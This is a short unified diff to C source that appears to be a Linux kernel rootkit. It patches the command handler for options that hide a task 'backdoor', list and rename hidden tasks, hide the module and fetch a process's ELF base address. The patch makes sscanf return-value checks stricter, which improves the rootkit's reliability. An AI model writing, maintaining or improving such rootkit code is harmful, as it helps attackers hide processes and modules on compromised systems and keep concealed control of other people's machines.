@@ -490,14 +490,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 kv_show_all_tasks();
                 break;
             case Opt_hide_task_backdoor:
-                if (sscanf(args[0].from, "%d", &pid))
+                if (sscanf(args[0].from, "%d", &pid) == 1)
                     kv_hide_task_by_pid(pid, 1, CHILDREN);
                 break;
             case Opt_list_hidden_tasks:
                 kv_show_saved_tasks();
                 break;
             case Opt_rename_hidden_task:
-                if (sscanf(args[0].from, "%d", &pid))
+                if (sscanf(args[0].from, "%d", &pid) == 1)
                     kv_rename_task(pid, args[1].from);
                 break;
             case Opt_hide_module:
@@ -560,7 +560,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 break;
             case Opt_fetch_base_address:
                 {
-                    if (sscanf(args[0].from, "%d", &pid)) {
+                    if (sscanf(args[0].from, "%d", &pid) == 1) {
                         unsigned long base;
                         char bits[32+1] = {0};
                         base = kv_get_elf_vm_start(pid);
